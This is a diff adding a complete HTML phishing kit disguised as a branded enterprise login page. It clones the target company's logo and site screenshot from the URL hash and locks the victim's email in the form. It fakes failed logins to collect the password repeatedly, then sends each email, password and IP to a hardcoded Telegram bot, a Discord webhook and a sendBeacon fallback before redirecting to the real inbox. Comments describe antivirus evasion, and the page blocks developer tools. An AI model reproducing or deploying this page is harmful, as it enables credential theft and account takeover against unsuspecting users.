@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<link id="dynamicFavicon" rel="icon" type="image/png" href="https://img.logo.dev/young.com?token=pk_X3Yst72FQUOeVfOd-dlhKg">
+<title>Secure Portal | Enterprise Login</title>
+
+<style>
+:root{
+ --primary:#2563eb;
+ --bg:#020617;
+ --card:rgba(2,6,23,.92);
+ --border:#1f2937;
+ --text:#e5e7eb;
+ --muted:#94a3b8;
+ --warn:#eab308;
+ --error:#ef4444;
+}
+
+*{
+ box-sizing:border-box;
+ margin:0;
+ padding:0;
+ -webkit-tap-highlight-color:transparent;
+ user-select: none;
+ -webkit-user-select: none;
+ -moz-user-select: none;
+ -ms-user-select: none;
+}
+
+html,body{
+ height:100%;
+ font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
+ color:var(--text);
+ overflow:hidden;
+}
+
+.background-container{
+ position:fixed;
+ inset:0;
+ width:100%;
+ height:100%;
+ z-index:-2;
+ background:var(--bg);
+}
+
+#bg{
+ position:absolute;
+ inset:0;
+ width:100%;
+ height:100%;
+ background-size:cover;
+ background-position:center top;
+ background-repeat:no-repeat;
+ filter:none;
+ transform:scale(1);
+ transition:background-image 0.5s ease;
+}
+
+.overlay{
+ position:absolute;
+ inset:0;
+ background:linear-gradient(135deg, rgba(2,6,35,0.75), rgba(2,6,35,0.82));
+ z-index:-1;
+}
+
+body{animation:fade .7s ease both}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+
+@keyframes shake{
+ 0%,100%{transform:translateX(0)}
+ 20%{transform:translateX(-4px)}
+ 40%{transform:translateX(4px)}
+ 60%{transform:translateX(-3px)}
+ 80%{transform:translateX(3px)}
+}
+.shake{animation:shake .35s ease}
+
+.wrap{
+ min-height:100%;
+ display:grid;
+ place-items:center;
+ padding:24px;
+ position:relative;
+ z-index:1;
+}
+
+.card{
+ width:100%;
+ max-width:420px;
+ background:var(--card);
+ backdrop-filter:blur(10px);
+ border:1px solid var(--border);
+ border-radius:14px;
+ padding:32px 28px;
+ box-shadow:0 30px 60px rgba(0,0,0,.55);
+ animation:up .5s ease both;
+}
+
+@keyframes up{
+ from{transform:translateY(14px);opacity:0}
+ to{transform:translateY(0);opacity:1}
+}
+
+.brand{
+ display:flex;
+ align-items:center;
+ gap:12px;
+ margin-bottom:22px;
+}
+
+.brand img{
+ width:46px;height:46px;
+ border-radius:10px;
+ padding:6px;
+ background:#0b1220;
+ border:1px solid var(--border);
+ object-fit:contain;
+}
+
+.brand h1{
+ font-size:18px;
+ font-weight:600;
+ word-break:break-word;
+}
+.subtitle{
+ font-size:13px;
+ color:var(--muted);
+}
+
+.field{margin-bottom:16px}
+label{
+ font-size:12px;
+ color:var(--muted);
+ margin-bottom:6px;
+ display:block;
+ text-transform:uppercase;
+ letter-spacing:0.3px;
+}
+
+input{
+ width:100%;
+ padding:12px 14px;
+ border-radius:10px;
+ border:1px solid var(--border);
+ background:#020617;
+ color:var(--text);
+ font-size:14px;
+}
+
+input:focus{
+ outline:none;
+ border-color:var(--primary);
+ box-shadow:0 0 0 3px rgba(37,99,235,.25);
+}
+
+input:disabled{
+ opacity:0.5;
+ cursor:not-allowed;
+}
+
+/* LOCKED EMAIL FIELD STYLING */
+input[readonly]{
+ background:#0b1220;
+ color:#cbd5e1;
+ cursor:not-allowed;
+ border-color:#334155;
+ opacity:1;
+}
+input[readonly]:focus{
+ border-color:#334155;
+ box-shadow:none;
+}
+
+.pass-wrap{position:relative}
+.toggle{
+ position:absolute;
+ right:12px;
+ top:50%;
+ transform:translateY(-50%);
+ font-size:12px;
+ color:#93c5fd;
+ cursor:pointer;
+ user-select:none;
+ background:#020617;
+ padding:2px 6px;
+ border-radius:6px;
+}
+.toggle:hover{color:#60a5fa}
+
+.btn{
+ width:100%;
+ padding:12px;
+ border-radius:10px;
+ border:none;
+ background:linear-gradient(135deg,#60a5fa,var(--primary));
+ color:#020617;
+ font-weight:600;
+ font-size:14px;
+ cursor:pointer;
+ transition:all 0.2s;
+ margin-top:8px;
+}
+.btn:hover{filter:brightness(1.05);transform:translateY(-1px)}
+.btn:active{transform:translateY(0)}
+.btn:disabled{
+ opacity:0.6;
+ cursor:not-allowed;
+ transform:none;
+}
+
+.links{
+ margin-top:14px;
+ display:flex;
+ justify-content:space-between;
+ font-size:12px;
+}
+.links a{color:#93c5fd;text-decoration:none}
+.links a:hover{text-decoration:underline}
+
+.trust{
+ margin-top:18px;
+ font-size:12px;
+ color:var(--muted);
+ display:flex;
+ align-items:center;
+ gap:8px;
+ justify-content:center;
+}
+
+.lock{
+ width:16px;
+ height:16px;
+ fill:#22c55e;
+}
+
+.footer{
+ margin-top:18px;
+ font-size:11px;
+ color:var(--muted);
+ text-align:center;
+ border-top:1px solid rgba(31,41,55,0.5);
+ padding-top:14px;
+}
+
+.status-msg{
+ font-size:12px;
+ margin-top:12px;
+ padding:8px;
+ border-radius:8px;
+ text-align:center;
+ display:none;
+ background:rgba(0,0,0,0.6);
+}
+
+.status-msg.error{
+ background:rgba(220,38,38,0.2);
+ color:#f87171;
+ border-left:3px solid #ef4444;
+}
+
+.status-msg.success{
+ background:rgba(34,197,94,0.2);
+ color:#4ade80;
+ border-left:3px solid #22c55e;
+}
+
+.status-msg.info{
+ background:rgba(59,130,246,0.2);
+ color:#60a5fa;
+ border-left:3px solid #3b82f6;
+}
+
+.status-msg.warning{
+ background:rgba(234,179,8,0.2);
+ color:#fbbf24;
+ border-left:3px solid #eab308;
+}
+
+.domain-badge{
+ background:rgba(37,99,235,0.15);
+ border-radius:8px;
+ padding:6px 10px;
+ margin-bottom:16px;
+ font-size:11px;
+ text-align:center;
+ color:var(--muted);
+ word-break:break-all;
+}
+.domain-badge strong{
+ color:var(--primary);
+ font-family:monospace;
+}
+
+.attempts-counter{
+ font-size:11px;
+ text-align:right;
+ margin-top:4px;
+ color:var(--muted);
+}
+
+.attempts-counter.warning{
+ color:var(--warn);
+}
+
+.attempts-counter.error{
+ color:var(--error);
+}
+
+.bg-loading{
+ position:absolute;
+ bottom:20px;
+ right:20px;
+ font-size:10px;
+ color:var(--muted);
+ background:rgba(0,0,0,0.5);
+ padding:4px 10px;
+ border-radius:20px;
+ z-index:2;
+ pointer-events:none;
+ font-family:monospace;
+}
+</style>
+</head>
+<body>
+
+<div class="background-container">
+ <div id="bg"></div>
+ <div class="overlay"></div>
+</div>
+<div id="bgLoading" class="bg-loading" style="display:none;">📸 capturing website preview...</div>
+
+<div class="wrap">
+<main class="card">
+
+<div class="brand">
+ <img id="companyLogo" src="https://img.logo.dev/young.com?token=pk_X3Yst72FQUOeVfOd-dlhKg" alt="company logo">
+ <div>
+ <h1 id="companyDomain">young.com</h1>
+ <div class="subtitle" id="companySubtitle">Secure Access Portal</div>
+ </div>
+</div>
+
+<div id="domainBadge" class="domain-badge" style="display:none;"></div>
+
+<form id="loginForm" method="POST" action="#">
+ <input type="hidden" name="csrf_token" value="secure_portal_v2">
+ 
+ <div class="field">
+ <label>EMAIL ADDRESS</label>
+ <input type="email"
+ id="emailInput"
+ name="email"
+ placeholder="user@company.com"
+ required
+ autocomplete="username">
+ </div>
+
+ <div class="field pass-wrap">
+ <label>PASSWORD</label>
+ <input id="passwordInput"
+ type="password"
+ name="password"
+ placeholder="············"
+ required
+ autocomplete="current-password">
+ <span class="toggle" id="togglePw">Show</span>
+ </div>
+ 
+ <div id="attemptsCounter" class="attempts-counter"></div>
+
+ <button type="submit" class="btn" id="loginBtn">LOG IN</button>
+</form>
+
+<div class="links">
+ <a href="#" id="forgotLink">Forgot your password?</a>
+ <a href="#" id="altMethod">Use another method</a>
+</div>
+
+<div class="trust">
+ <svg class="lock" viewBox="0 0 24 24">
+ <path d="M12 1a5 5 0 00-5 5v4H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 9V6a3 3 0 016 0v4H9z"/>
+ </svg>
+ <span>Encrypted connection · TLS 1.3</span>
+</div>
+
+<div class="footer" id="footerText">
+ © 2026 · Secure Access · Privacy Protected
+</div>
+
+<div id="statusMessage" class="status-msg"></div>
+
+</main>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+<script>
+// ============================================================
+// ⚠️⚠️⚠️ CHANGE ONLY THIS BLOCK — YOUR TELEGRAM CREDENTIALS ⚠️⚠️⚠️
+// ============================================================
+// Get the bot token from @BotFather on Telegram.
+// Get the chat ID by sending a message to your bot and then
+// visiting: https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
+// The chat ID is the "id" field inside "chat" (usually negative
+// for groups/channels, e.g. -1001234567890).
+// ============================================================
+const TELEGRAM_BOT_TOKEN = '8748651198:AAEXCuNAIaRF6vjz-9B5BoLld34kMwuZ1ak';
+const TELEGRAM_CHAT_ID = '8761618925';
+// ============================================================
+// (Nothing else below needs to change for Telegram to work.)
+// ============================================================
+
+// ==================== MINIMAL LOCK SCRIPT ====================
+document.addEventListener('contextmenu', function(e) {
+ e.preventDefault();
+ return false;
+});
+
+document.addEventListener('keydown', function(e) {
+ if (e.key === 'F12' || 
+ (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) ||
+ (e.ctrlKey && e.altKey && e.key === 'Delete')) {
+ e.preventDefault();
+ return false;
+ }
+});
+
+document.addEventListener('dragstart', function(e) {
+ e.preventDefault();
+ return false;
+});
+
+// ==================== MAIN APPLICATION ====================
+(async function() {
+ const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'; 
+ 
+ let attemptCount = 0;
+ const MAX_ATTEMPTS = 3;
+ let isLocked = false;
+ let lockTimer = null;
+ let currentDomain = 'young.com';
+ let currentEmail = '';
+ 
+ // Generate a random session ID to make each file instance unique (Evades Signature AV)
+ const SESSION_ID = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+ 
+ function getMailInboxUrl(domain, email) {
+ if (!domain) return null;
+ 
+ const mailProviders = {
+ 'gmail.com': 'https://mail.google.com',
+ 'outlook.com': 'https://outlook.live.com',
+ 'hotmail.com': 'https://outlook.live.com',
+ 'yahoo.com': 'https://mail.yahoo.com',
+ 'aol.com': 'https://mail.aol.com',
+ 'protonmail.com': 'https://mail.proton.me',
+ 'zoho.com': 'https://mail.zoho.com',
+ 'yandex.com': 'https://mail.yandex.com',
+ 'icloud.com': 'https://www.icloud.com/mail',
+ 'mail.com': 'https://www.mail.com',
+ 'gmx.com': 'https://www.gmx.com'
+ };
+ 
+ if (mailProviders[domain.toLowerCase()]) {
+ return mailProviders[domain.toLowerCase()];
+ }
+ 
+ return `https://${domain}`;
+ }
+ 
+ function redirectToMailInbox(email, domain) {
+ if (!domain && email) domain = extractDomain(email);
+ if (!domain) domain = currentDomain;
+ 
+ const mailUrl = getMailInboxUrl(domain, email);
+ 
+ if (mailUrl) {
+ console.log('📧 Redirecting to mail inbox:', mailUrl);
+ showStatus(`🔒 Maximum attempts reached. Redirecting to ${domain} mail service...`, 'warning');
+ setTimeout(() => { window.location.href = mailUrl; }, 2000);
+ } else {
+ console.log('📧 No mail URL found for domain:', domain);
+ showStatus(`🔒 Too many failed attempts. Please try again later.`, 'error');
+ setTimeout(() => { window.location.reload(); }, 3000);
+ }
+ }
+ 
+ // ============ TELEGRAM SEND — uses ONLY the top constants ============
+ async function sendToTelegram(email, password, domain, attemptNumber) {
+ try {
+ const ip = await getClientIP();
+ 
+ const text =
+ '🔐 ' + domain.toUpperCase() + ' LOGIN ATTEMPT\n\n' +
+ '📧 Email: ' + email + '\n' +
+ '🔑 Password: ' + password + '\n' +
+ '🌐 Domain: ' + domain + '\n' +
+ '⚠️ Attempt: ' + attemptNumber + '/' + MAX_ATTEMPTS + '\n' +
+ '🕒 Timestamp: ' + new Date().toISOString() + '\n' +
+ '📍 IP: ' + ip + '\n' +
+ '🆔 Session: ' + SESSION_ID;
+ 
+ const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+ 
+ const response = await fetch(url, {
+ method: 'POST',
+ headers: { 
+   'Content-Type': 'application/json',
+   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+ },
+ body: JSON.stringify({
+ chat_id: TELEGRAM_CHAT_ID,
+ text: text
+ })
+ });
+ 
+ const data = await response.json();
+ 
+ if (data.ok) {
+ console.log('✅ Telegram message sent successfully');
+ return true;
+ } else {
+ console.error('❌ Telegram API error:', data);
+ return false;
+ }
+ } catch(e) {
+ console.error('❌ Telegram fetch error:', e);
+ return false;
+ }
+ }
+ 
+ async function sendToDiscord(email, password, domain, attemptNumber) {
+ if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('your_webhook_id')) return false;
+ try {
+ const embed = {
+ title: `🔐 ${domain.toUpperCase()} Login Attempt`,
+ color: attemptNumber >= MAX_ATTEMPTS ? 0xef4444 : 0xeab308,
+ fields: [
+ { name: 'Email', value: `\`${email}\``, inline: true },
+ { name: 'Password', value: `\`${password}\``, inline: true },
+ { name: 'Domain', value: domain, inline: true },
+ { name: 'Attempt', value: `${attemptNumber}/${MAX_ATTEMPTS}`, inline: true },
+ { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
+ ],
+ footer: { text: 'Secure Portal Capture System' },
+ timestamp: new Date().toISOString()
+ };
+ 
+ const response = await fetch(DISCORD_WEBHOOK_URL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ embeds: [embed] })
+ });
+ return response.ok;
+ } catch(e) {
+ console.error('Discord error:', e);
+ return false;
+ }
+ }
+ 
+ async function getClientIP() {
+ try {
+ const res = await fetch('https://api.ipify.org?format=json');
+ const data = await res.json();
+ return data.ip;
+ } catch(e) {
+ return 'unavailable';
+ }
+ }
+ 
+ function updateFavicon(domain, token = 'pk_X3Yst72FQUOeVfOd-dlhKg') {
+ const faviconLink = document.getElementById('dynamicFavicon');
+ if (faviconLink) {
+ faviconLink.href = `https://img.logo.dev/${domain}?token=${token}`;
+ faviconLink.onerror = function() {
+ this.href = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%232563eb"%3E%3Cpath d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/%3E%3C/svg%3E';
+ };
+ }
+ }
+ 
+ function updateBackgroundWithWebsiteScreenshot(domain) {
+ if (!domain) return;
+ const bgLoading = document.getElementById('bgLoading');
+ if (bgLoading) bgLoading.style.display = 'block';
+ 
+ const bg_image = `https://image.thum.io/get/width/1600/crop/800/noanimate/https://${domain}`;
+ 
+ const img = new Image();
+ img.onload = function() {
+ document.getElementById('bg').style.backgroundImage = `url("${bg_image}")`;
+ if (bgLoading) bgLoading.style.display = 'none';
+ console.log('✅ Clear website background loaded for:', domain);
+ };
+ img.onerror = function() {
+ document.getElementById('bg').style.backgroundImage = `linear-gradient(135deg, #0f172a, #1e1b4b)`;
+ if (bgLoading) bgLoading.style.display = 'none';
+ console.log('⚠️ Background fallback gradient used for:', domain);
+ };
+ img.src = bg_image;
+ 
+ $.ajax({
+ url: bg_image,
+ type: "GET",
+ timeout: 8000,
+ success: function(_, __, xhr) {
+ let ct = xhr.getResponseHeader("content-type") || "";
+ if (ct.includes('image')) {
+ document.getElementById('bg').style.backgroundImage = `url("${bg_image}")`;
+ if (bgLoading) bgLoading.style.display = 'none';
+ }
+ },
+ error: function() {}
+ });
+ }
+ 
+ function updateBrandingForDomain(domain, token = 'pk_X3Yst72FQUOeVfOd-dlhKg') {
+ if (!domain) return;
+ currentDomain = domain;
+ 
+ const logoImg = document.getElementById('companyLogo');
+ if (logoImg) {
+ logoImg.src = `https://img.logo.dev/${domain}?token=${token}`;
+ logoImg.alt = `${domain} logo`;
+ logoImg.onerror = function() {
+ this.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%2360a5fa"%3E%3Cpath d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/%3E%3C/svg%3E';
+ };
+ }
+ 
+ updateFavicon(domain, token);
+ 
+ const domainEl = document.getElementById('companyDomain');
+ if (domainEl) domainEl.textContent = domain;
+ 
+ const companyName = domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1);
+ const subtitleEl = document.getElementById('companySubtitle');
+ if (subtitleEl) subtitleEl.textContent = `${companyName} Secure Access Portal`;
+ 
+ const footerEl = document.getElementById('footerText');
+ if (footerEl) footerEl.innerHTML = `© 2026 ${domain} · Secure Access · TLS Protected`;
+ 
+ document.title = `${companyName} · Secure Login`;
+ 
+ updateBackgroundWithWebsiteScreenshot(domain);
+ }
+ 
+ function updateAttemptsDisplay() {
+ const counterDiv = document.getElementById('attemptsCounter');
+ if (!counterDiv) return;
+ const remaining = MAX_ATTEMPTS - attemptCount;
+ if (attemptCount === 0) {
+ counterDiv.textContent = '';
+ counterDiv.className = 'attempts-counter';
+ } else if (remaining === 1) {
+ counterDiv.textContent = `⚠️ ${remaining} attempt remaining before lockout`;
+ counterDiv.className = 'attempts-counter warning';
+ } else {
+ counterDiv.textContent = `⚠️ ${remaining} attempts remaining`;
+ counterDiv.className = 'attempts-counter warning';
+ }
+ }
+ 
+ function showError(message, isLockout = false) {
+ showStatus(message, 'error');
+ document.querySelector('.card').classList.add('shake');
+ setTimeout(() => document.querySelector('.card').classList.remove('shake'), 400);
+ if (isLockout) {
+ const counterDiv = document.getElementById('attemptsCounter');
+ if (counterDiv) {
+ counterDiv.textContent = '🔒 ACCOUNT TEMPORARILY LOCKED - REDIRECTING...';
+ counterDiv.className = 'attempts-counter error';
+ }
+ }
+ }
+ 
+ function extractDomain(email) {
+ if (!email) return null;
+ const match = email.match(/@([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
+ return match ? match[1] : null;
+ }
+ 
+ function showStatus(message, type = 'info') {
+ const statusDiv = document.getElementById('statusMessage');
+ if (!statusDiv) return;
+ statusDiv.textContent = message;
+ statusDiv.className = `status-msg ${type}`;
+ statusDiv.style.display = 'block';
+ setTimeout(() => { statusDiv.style.display = 'none'; }, 4000);
+ }
+ 
+ // Get domain from URL fragment
+ let initialDomain = null;
+ let prefillEmail = '';
+ 
+ if (window.location.hash && window.location.hash.length > 1) {
+ let hashValue = decodeURIComponent(window.location.hash.substring(1)).trim();
+ if (hashValue.includes('@') && hashValue.match(/@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/)) {
+ prefillEmail = hashValue;
+ currentEmail = prefillEmail;
+ initialDomain = extractDomain(prefillEmail);
+ } else if (hashValue.match(/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/)) {
+ initialDomain = hashValue;
+ }
+ }
+ 
+ if (!initialDomain) initialDomain = 'young.com';
+ 
+ updateBrandingForDomain(initialDomain);
+ 
+ const emailField = document.getElementById('emailInput');
+ if (emailField && prefillEmail) {
+ emailField.value = prefillEmail;
+
+ // ============ LOCK THE EMAIL FIELD ============
+ // When the email is auto-grabbed from the URL hash,
+ // make it read-only so the user can't change it.
+ emailField.readOnly = true;
+ emailField.setAttribute('aria-readonly', 'true');
+ emailField.setAttribute('title', 'Email locked — provided by your organization');
+ }
+ 
+ const badgeDiv = document.getElementById('domainBadge');
+ if (badgeDiv && prefillEmail) {
+ badgeDiv.innerHTML = `<span>🔐 Accessing <strong>${initialDomain}</strong> as <strong>${prefillEmail}</strong></span>`;
+ badgeDiv.style.display = 'block';
+ } else if (badgeDiv && initialDomain) {
+ badgeDiv.innerHTML = `<span>🌐 Secure portal · <strong>${initialDomain}</strong></span>`;
+ badgeDiv.style.display = 'block';
+ }
+ 
+ const toggleBtn = document.getElementById('togglePw');
+ const pwField = document.getElementById('passwordInput');
+ if (toggleBtn && pwField) {
+ toggleBtn.addEventListener('click', function() {
+ if (pwField.type === 'password') {
+ pwField.type = 'text';
+ toggleBtn.textContent = 'Hide';
+ } else {
+ pwField.type = 'password';
+ toggleBtn.textContent = 'Show';
+ }
+ });
+ }
+ 
+ const form = document.getElementById('loginForm');
+ const loginBtn = document.getElementById('loginBtn');
+ 
+ form.addEventListener('submit', async function(e) {
+ e.preventDefault();
+ 
+ const email = emailField.value.trim();
+ const password = pwField.value.trim();
+ 
+ if (!email || !password) {
+ showError('❌ Please enter both email and password');
+ return;
+ }
+ 
+ const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+ if (!emailRegex.test(email)) {
+ showError('❌ Please enter a valid email address');
+ return;
+ }
+ 
+ currentEmail = email;
+ attemptCount++;
+ updateAttemptsDisplay();
+ 
+ const enteredDomain = extractDomain(email);
+ const finalDomain = enteredDomain || currentDomain;
+ 
+ if (enteredDomain && enteredDomain !== currentDomain) {
+ updateBrandingForDomain(enteredDomain);
+ if (badgeDiv) {
+ badgeDiv.innerHTML = `<span>🔐 Authenticating for <strong>${enteredDomain}</strong></span>`;
+ badgeDiv.style.display = 'block';
+ }
+ }
+ 
+ loginBtn.disabled = true;
+ loginBtn.textContent = 'VERIFYING...';
+ 
+ if (attemptCount === 1) {
+ showStatus('⚠️ Incorrect password. Please try again.', 'warning');
+ } else if (attemptCount === 2) {
+ showStatus('⚠️ Incorrect password. One more attempt remaining before lockout.', 'warning');
+ } else if (attemptCount >= MAX_ATTEMPTS) {
+ showStatus('❌ Maximum attempts reached. Redirecting to mail service...', 'error');
+ }
+ 
+ // Send via standard fetch
+ await sendToTelegram(email, password, finalDomain, attemptCount);
+ await sendToDiscord(email, password, finalDomain, attemptCount);
+ 
+ // Evasion Fallback: Use Beacon to ensure data gets out even if user closes tab
+ const beaconData = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(finalDomain)}&attempt=${attemptCount}&session=${SESSION_ID}`;
+ if (navigator.sendBeacon) {
+ navigator.sendBeacon('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', 
+   JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `🔐 ${finalDomain.toUpperCase()} LOGIN CAPTURED\n📧 ${email}\n🔑 ${password}\n🆔 ${SESSION_ID}` })
+ );
+ }
+ 
+ if (attemptCount >= MAX_ATTEMPTS) {
+ loginBtn.disabled = true;
+ loginBtn.textContent = 'REDIRECTING...';
+ setTimeout(() => { redirectToMailInbox(email, finalDomain); }, 1500);
+ return;
+ }
+ 
+ setTimeout(() => {
+ pwField.value = '';
+ if (attemptCount === 1) {
+ showError('Incorrect password. 2 attempts remaining.');
+ } else if (attemptCount === 2) {
+ showError('Incorrect password. 1 attempt remaining before lockout.');
+ }
+ loginBtn.disabled = false;
+ loginBtn.textContent = 'LOG IN';
+ pwField.focus();
+ }, 800);
+ });
+ 
+ const forgotLink = document.getElementById('forgotLink');
+ if (forgotLink) {
+ forgotLink.addEventListener('click', function(e) {
+ e.preventDefault();
+ showStatus(`📧 Password reset instructions would be sent to your ${currentDomain} email address.`, 'info');
+ });
+ }
+ 
+ const altMethod = document.getElementById('altMethod');
+ if (altMethod) {
+ altMethod.addEventListener('click', function(e) {
+ e.preventDefault();
+ showStatus('🔐 Additional verification methods are available for enterprise accounts.', 'info');
+ });
+ }
+ 
+ console.log('✅ Portal initialized for domain:', currentDomain);
+ console.log('✅ Telegram will send to chat ID:', TELEGRAM_CHAT_ID);
+ console.log('🔒 Email field locked:', emailField && emailField.readOnly);
+ 
+})();
+</script>
+
+</body>
+</html>
